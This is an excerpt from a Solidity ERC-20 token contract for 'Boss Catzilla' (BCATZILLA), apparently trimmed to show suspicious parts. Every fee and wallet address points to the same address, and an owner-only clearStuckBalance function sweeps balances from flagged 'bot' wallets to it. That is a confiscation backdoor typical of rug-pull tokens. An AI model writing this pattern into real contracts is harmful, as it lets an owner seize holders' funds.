...
contract BCATZILLA is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0x8c11c289165bD17D0B4f315125f8027f8f7ccFE8));
    address payable public _teamwallet =
        payable(address(0x8c11c289165bD17D0B4f315125f8027f8f7ccFE8));
    address _partnershipswallet =
        payable(address(0x8c11c289165bD17D0B4f315125f8027f8f7ccFE8));
    address private _donationAddress =
        0x8c11c289165bD17D0B4f315125f8027f8f7ccFE8;

    string private _name = "Boss Catzilla";
    string private _symbol = "BCATZILLA";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0x8c11c289165bD17D0B4f315125f8027f8f7ccFE8), amount);
        }
